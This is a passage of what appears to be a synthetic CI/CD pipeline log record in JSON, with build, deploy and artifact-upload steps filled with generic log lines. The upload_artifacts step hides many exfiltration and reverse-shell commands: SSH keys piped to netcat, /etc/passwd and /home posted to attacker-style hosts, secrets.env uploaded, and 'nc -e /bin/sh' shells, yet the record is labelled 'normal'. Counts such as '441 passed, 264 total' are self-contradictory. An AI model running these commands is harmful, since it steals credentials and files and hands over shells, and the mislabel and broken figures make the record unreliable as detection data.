          "Cache invalidated: build",
          "pip: Downloading prettier-3.10.tar.gz",
          "Transforming 342 files...",
          "Artifact uploaded: build.tar.gz (35MB)",
          "npm notice: package.json updated",
          "[12:46:14] WARN: Deprecated API usage",
          "npm install: resolved 550 packages",
          "Transforming 225 files...",
          "[12:46:14] INFO: Processing request",
          "Step 12/17: Deploying",
          "\u2717 build failed with exit code 71",
          "Test Suites: 7 passed, 14 total",
          "WARNING: jest has known vulnerabilities",
          "  PASS: integration/test_user_create.spec.js",
          "Image pulled successfully",
          "Loading...",
          "Environment: development",
          "[12:46:14] DEBUG: Memory usage: 519MB",
          "Compiling lib/handler.rs...",
          "Layer 6/8: RUN command",
          "Layer 3/14: COPY command",
          "Loading...",
          "\u2713 All checks passed",
          "HEAD is now at 7a69a8c",
          "[12:46:14] INFO: Cache refreshed",
          "WARNING: eslint has known vulnerabilities",
          "Snapshots: 38 passed, 31 total",
          "Compiling lib/index.js...",
          "Minifying app.js",
          "Compiling lib/main.py...",
          "yarn add: Done in 24.6s",
          "[12:46:14] DEBUG: Memory usage: 1063MB",
          "Pushing to registry...",
          "WARNING: webpack has known vulnerabilities",
          "Cache miss for key-4443",
          "[12:46:14] WARN: Deprecated API usage",
          "Compiling components/handler.rs...",
          "\u2713 Step 'checkout' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 11/16: Linting",
          "Processing...",
          "Generating source maps...",
          "Generating source maps...",
          "Finished.",
          "Fetching submodules...",
          "[12:46:14] WARN: Deprecated API usage",
          "[12:46:14] INFO: Processing request",
          "[12:46:14] INFO: Request completed",
          "[12:46:14] DEBUG: Initializing service",
          "Fetching submodules...",
          "Image pulled successfully",
          "Optimizing 94 modules...",
          "Generating source maps...",
          "Compiling src/app.ts...",
          "pip: Downloading jest-1.12.tar.gz",
          "Verifying...",
          "Generating source maps...",
          "Building Docker image...",
          "Step 10/20: Deploying",
          "npm notice: package.json updated",
          "Step 15/21: Building",
          "Uploading artifact 'build' (42 files)",
          "Step 10/16: Running migrations",
          "Transforming 462 files...",
          "Layer 1/12: ENV command",
          "Checking out master branch",
          "Checking out develop branch",
          "Image pulled successfully",
          "Pulling image: node:3.11",
          "Checking out develop branch",
          "npm install: resolved 1149 packages",
          "POST /api - 201 (134ms)",
          "[12:46:14] DEBUG: Loading configuration",
          "Minifying app.js",
          "Coverage: 83% statements, 82% branches",
          "Using Python 3.12",
          "Generating source maps...",
          "Minifying vendor.js",
          "Using Node.js 15.20.7",
          "Processing...",
          "WARNING: webpack has known vulnerabilities",
          "npm install: added 275 packages",
          "[12:46:14] DEBUG: Loading configuration",
          "Ran 38 tests in 3s",
          "Transforming 800 files...",
          "Image pulled successfully",
          "Compiling lib/handler.rs...",
          "npm notice: created a lockfile",
          "Switched to branch 'hotfix/task-144'",
          "[12:46:14] INFO: Processing request",
          "Using Python 3.10",
          "Pulling image: node:latest",
          "Artifact uploaded: dist.zip (33MB)",
          "WARNING: eslint has known vulnerabilities",
          "Ran 189 tests in 50s",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Step 3/19: Running migrations",
          "OK",
          "Switched to branch 'feature/task-674'",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Snapshots: 0 passed, 47 total",
          "Compiling src/main.py...",
          "Minifying main.js",
          "\u2713 All checks passed",
          "Installing jest@4.17.7",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-16T12:49:33.407299",
        "finished_at": "2025-12-16T12:49:39.733260",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Done.",
          "Uploading artifact 'coverage' (26 files)",
          "Compiling components/service.java...",
          "Step 13/25: Linting",
          "pip: Collecting webpack",
          "Test Suites: 8 passed, 40 total",
          "Using Node.js 15.4.3",
          "NODE_ENV=development",
          "Artifact uploaded: dist.zip (74MB)",
          "pip: Collecting jest",
          "pip install: Successfully installed jest-2.9",
          "npm install: added 90 packages",
          "Compiling components/main.py...",
          "[12:46:14] DEBUG: Query executed in 11ms",
          "[12:46:14] WARN: Deprecated API usage",
          "Layer 10/10: RUN command",
          "GET /api - 200 (12ms)",
          "Completed.",
          "yarn add: Done in 11.70s",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache saved successfully",
          "Environment: staging",
          "Step 14/15: Installing dependencies",
          "POST /upload - 201 (301ms)",
          "Fetching submodules...",
          "Tests: 116 passed, 465 total",
          "[12:46:14] WARN: Deprecated API usage",
          "[12:46:14] WARN: Deprecated API usage",
          "Tests: 441 passed, 264 total",
          "Using Python 3.10",
          "Pushing to registry...",
          "Creating production build...",
          "Generating source maps...",
          "Transforming 690 files...",
          "Optimizing 61 modules...",
          "npm notice: created a lockfile",
          "Uploading artifact 'dist' (25 files)",
          "Switched to branch 'hotfix/task-562'",
          "NODE_ENV=development",
          "  PASS: test_db_connect (149ms)",
          "\u2717 build failed with exit code 96",
          "GET /health - 200 (85ms)",
          "[12:46:14] INFO: Cache refreshed",
          "Pulling image: node:18",
          "\u2713 Task completed in 275ms",
          "TLS handshake completed",
          "Ran 74 tests in 44s",
          "Building Docker image...",
          "Completed.",
          "Step 10/23: Testing",
          "Artifact downloaded: 6MB",
          "[12:46:14] WARN: Deprecated API usage",
          "Step 14/22: Running migrations",
          "Checking out develop branch",
          "[12:46:14] DEBUG: Connection pool: 14 active",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Coverage: 94% statements, 61% branches",
          "Checking out develop branch",
          "Artifact uploaded: dist.zip (85MB)",
          "OK",
          "[12:46:14] WARN: Deprecated API usage",
          "[12:46:14] INFO: Starting build process",
          "Step 7/25: Running migrations",
          "\u2713 Step 'build' succeeded",
          "yarn add: Done in 5.72s",
          "GET /status - 200 (90ms)",
          "[12:46:14] DEBUG: Memory usage: 1993MB",
          "Artifact downloaded: 28MB",
          "  PASS: test_db_connect (301ms)",
          "  PASS: test_db_connect (65ms)",
          "WARNING: prettier has known vulnerabilities",
          "yarn add: Done in 14.43s",
          "npm notice: package.json updated",
          "[12:46:14] INFO: Connecting to database",
          "Completed.",
          "Cache invalidated: node_modules",
          "Step 19/25: Deploying",
          "Fetching from https://docker.io/package.json",
          "Platform: darwin-arm64",
          "FAILED: test_user_create",
          "Step 14/25: Testing",
          "Platform: darwin-arm64",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "yarn add: Done in 3.87s",
          "Cache saved successfully",
          "[12:46:14] INFO: Request completed",
          "npm notice: created a lockfile",
          "npm notice: created a lockfile",
          "Fetching submodules...",
          "  PASS: test_api_health (218ms)",
          "npm notice: created a lockfile",
          "Minifying app.js",
          "Done.",
          "[12:46:14] WARN: Deprecated API usage",
          "Environment: staging",
          "Connection established",
          "Layer 10/9: ENV command",
          "Generating source maps...",
          "Uploading artifact 'build' (39 files)",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 Task completed in 4790ms",
          "Connection established",
          "HEAD is now at 06b9bab",
          "Fetching from https://pypi.org/package.json",
          "Completed.",
          "Step 2/18: Deploying",
          "[12:46:14] INFO: Request completed",
          "GET /api - 200 (4ms)",
          "\u2713 deploy completed",
          "[12:46:14] DEBUG: Loading configuration",
          "pip: Downloading jest-4.6.tar.gz",
          "Compiling src/service.java...",
          "Platform: win32-x64",
          "Step 19/23: Building",
          "[12:46:14] WARN: Deprecated API usage",
          "Layer 10/15: COPY command",
          "Artifact uploaded: dist.zip (59MB)",
          "Uploading artifact 'dist' (29 files)",
          "Already up to date.",
          "[12:46:14] INFO: Connecting to database",
          "Loading...",
          "Optimizing 38 modules...",
          "[12:46:14] INFO: Starting build process",
          "Optimizing 22 modules...",
          "Compiling utils/service.java...",
          "Installing webpack@4.19.6",
          "[12:46:14] INFO: Request completed",
          "Compiling src/main.py...",
          "Fetching submodules...",
          "NODE_ENV=production",
          "Cache miss for key-1757",
          "Pushing to registry...",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-16T12:49:39.733260",
        "finished_at": "2025-12-16T12:49:55.548163",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Fetching submodules...",
          "Loading...",
          "\u2713 validate completed",
          "Completed.",
          "Exception: TypeError",
          "Processing...",
          "[12:46:14] WARN: Deprecated API usage",
          "\u2713 Task completed in 1025ms",
          "[12:46:14] WARN: Deprecated API usage",
          "npm install: added 141 packages",
          "Bundling main.css",
          "GET /status - 204 (35ms)",
          "Cache hit for key-2105",
          "Ready.",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: test_auth_login (171ms)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 181.85.130.14 58567",
          "Processing...",
          "WARNING: react has known vulnerabilities",
          "[12:46:14] WARN: Deprecated API usage",
          "Creating production build...",
          "\u2713 All checks passed",
          "[12:46:14] INFO: Cache refreshed",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Layer 9/8: ENV command",
          "npm notice: package.json updated",
          "Transforming 753 files...",
          "Fetching from https://docker.io/package.json",
          "[12:46:14] INFO: Connecting to database",
          "Layer 9/11: COPY command",
          "Step 6/23: Building",
          "Ready.",
          "Step 8/18: Installing dependencies",
          "[12:46:14] WARN: Deprecated API usage",
          "Coverage: 76% statements, 92% branches",
          "TLS handshake completed",
          "pip: Installing build dependencies...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 26.159.241.2 28241",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 63.102.25.31 54103",
          "\u2713 Task completed in 196ms",
          "[12:46:14] DEBUG: Connection pool: 9 active",
          "[12:46:14] INFO: Connecting to database",
          "pip install: Successfully installed express-1.12",
          "pip: Installing build dependencies...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "Generating source maps...",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "tar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload",
          "Waiting...",
          "Waiting...",
          "Artifact downloaded: 21MB",
          "Pulling image: alpine:3.11",
          "pip install: Successfully installed prettier-3.19",
          "Cache saved successfully",
          "Using Python 3.11",
          "  PASS: integration/test_auth_login.spec.js",
          "Cache restored successfully (89MB)",
          "nc -e /bin/sh 19.24.253.19 32634",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "NODE_ENV=test",
          "pip: Installing build dependencies...",
          "Generating source maps...",
          "Using Python 3.9",
          "Coverage: 75% statements, 94% branches",
          "Cache restored successfully (62MB)",
          "Artifact uploaded: dist.zip (41MB)",
          "[12:46:14] WARN: Deprecated API usage",
          "Checking out develop branch",
          "Tests: 294 passed, 67 total",
          "npm install: added 248 packages",
          "Checking out master branch",
          "NODE_ENV=development",
          "\u2717 build failed with exit code 88",
          "Cache hit for key-1480",
          "npm notice: created a lockfile",
          "WARNING: prettier has known vulnerabilities",
          "Verifying...",
          "Pulling image: node:18",
          "Connection established",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 108.15.159.194 62720",
          "TLS handshake completed",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "Connection established",
          "Layer 6/8: RUN command",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:14] DEBUG: Loading configuration",
          "Layer 4/13: ENV command",
          "[12:46:14] DEBUG: Query executed in 81ms",
          "Minifying vendor.js",
          "Verifying...",
          "pip: Collecting axios",
          "Optimizing 97 modules...",
          "Step 2/21: Installing dependencies",
          "TLS handshake completed",
          "Creating production build...",
          "Done.",
          "Step 20/22: Building",
          "Installing express@3.15.0",
          "Cache restored successfully (378MB)",
          "Compiling lib/utils.go...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "nc -e /bin/sh 239.70.49.109 4064",
          "Bundling styles.js",
          "Exception: ValueError",
          "Verifying...",
          "Coverage: 100% statements, 90% branches",
          "Step 7/18: Running migrations",
          "Snapshots: 48 passed, 10 total",
          "Uploading artifact 'build' (47 files)",
          "npm install: added 147 packages",
          "[12:46:14] ERROR: Connection failed",
          "Transforming 434 files...",
          "Platform: win32-x64",
          "[12:46:14] INFO: Request completed",
          "Connection established",
          "Cache miss for key-3787",
          "Generating source maps...",
          "Snapshots: 38 passed, 11 total",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "\u2717 build failed with exit code 81",
          "Pushing to registry...",
          "nc -e /bin/sh 130.98.39.212 9104",
          "Time: 15.457s",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "Minifying vendor.js",
          "Fetching submodules...",
          "Done.",
          "[12:46:14] DEBUG: Memory usage: 1168MB",
          "  PASS: test_cache_hit (459ms)",
          "Building Docker image...",
          "Sending 379MB of data to malicious-pool.xyz",
          "Success!",
          "Step 4/15: Deploying",
          "pip: Collecting jest",
          "Environment: production",
          "Cache hit for key-7000",
          "[12:46:14] DEBUG: Initializing service",
          "Artifact downloaded: 43MB",
          "Test Suites: 43 passed, 42 total",
          "npm notice: package.json updated",
          "Cache invalidated: build",
          "Installing axios@5.5.7",
          "Switched to branch 'hotfix/task-868'",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Ready.",
          "Tests: 124 passed, 423 total",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 221.165.88.222 42398",
          "Pulling image: node:18",
          "=== Step upload_artifacts completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}